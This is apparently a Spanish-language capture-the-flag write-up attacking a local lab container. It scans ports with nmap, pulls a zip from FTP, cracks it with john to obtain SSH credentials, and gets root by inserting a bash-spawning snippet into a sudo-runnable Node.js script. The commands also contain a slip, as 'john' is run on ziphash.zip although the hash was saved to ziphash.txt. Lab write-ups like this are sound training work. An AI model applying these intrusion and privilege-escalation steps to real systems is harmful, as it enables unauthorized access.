Fecha: 03/09/2024

Empiezo escaneando la máquina: 
```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```

![](../Imágenes/Pasted%20image%2020240903180050.png)
Descargo el comprimido que se ubica en ftp:
```bash
wget ftp://172.17.0.2/secretitopicaron.zip
```

Necesita una contraseña, así que uso john de ripper para buscarla:
```bash
zip2john secretitopicaron.zip > ziphash.txt
john ziphash.zip                  
```
![](../Imágenes/Pasted%20image%2020240903182308.png)
Conseguimos de esta manera un usuario (`mario`) y contraseña (`laKontraseñAmasmalotaHdelbarrioH`) para ssh. 
![](../Imágenes/Pasted%20image%2020240903182512.png)

Lo primero que miro al entrar es qué podemos ejecutar con sudo, encontrando que podemos ejecutar un script de js, que podemos editar nosotros mismos:
![](../Imágenes/Pasted%20image%2020240903182747.png)

Insertaré lo siguiente en el script y ya podré hacerme root:
```js
const { spawn } = require('child_process'); 

const shell = spawn('bash', { stdio: 'inherit', shell: true });
```

![](../Imágenes/Pasted%20image%2020240903183243.png)
